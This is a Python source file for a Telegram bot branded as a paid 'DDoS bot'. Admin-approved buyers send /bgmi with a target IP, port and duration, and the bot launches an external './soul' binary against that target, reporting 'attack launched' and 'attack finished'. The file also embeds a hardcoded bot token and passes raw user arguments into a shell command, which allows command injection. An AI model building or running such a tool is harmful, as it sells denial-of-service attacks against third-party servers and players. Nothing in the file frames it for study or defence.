import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '8060602517:AAG2xmSQhW-ettVba459KEotuYRbiAiQEAs'
ADMIN_USER_ID = 6062735907
APPROVED_IDS_FILE = 'approved_ids.txt'
bgmi_in_progress = False

# Load approved IDs (users and groups) from file
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_approved_ids(approved_ids):
    with open(APPROVED_IDS_FILE, 'w') as f:
        f.writelines(f"{id_}\n" for id_ in approved_ids)

approved_ids = load_approved_ids()

# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 APNABHAI 𝐃𝐃𝐎𝐒  *\n"
        "*PRIMIUM DDOS BOT*\n"
        "*OWNER :- @Seema206p9*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Approve command to approve users and group chat IDs
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /approve id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    approved_ids.add(target_id)
    save_approved_ids(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

# Remove command to remove approved users and group chat IDs
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /remove id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.discard(target_id)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

# bgmi command (only for approved users and groups)
async def bgmi(update: Update, context: CallbackContext):
    global bgmi_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if str(chat_id) not in approved_ids and user_id not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ buy karo Rs70 pay kar k🤝.*", parse_mode='Markdown')
        return

    if bgmi_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="* Please wait 1st bgmi complete for the next bgmi.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*  example » /bgmi ip port time*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
        f"*⭐ Target » {ip}*\n"
        f"*⭐ Port » {port}*\n"
        f"*⭐ Time » {time} seconds*\n"
        f"*https://t.me/+GYbpAGalM1Y0OTU1*\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_bgmi(chat_id, ip, port, time, context))

# Run bgmi function
async def run_bgmi(chat_id, ip, port, time, context):
    global bgmi_in_progress
    bgmi_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./soul {ip} {port} {time} 1900",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the bgmi: {str(e)}*", parse_mode='Markdown')

    finally:
        bgmi_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 🚨𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃🚨️ ✅*\n*SEND FEEDBACK TO OWNER*\n*@Seema206p9*", parse_mode='Markdown')

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.run_polling()

if __name__ == '__main__':
    main()
    
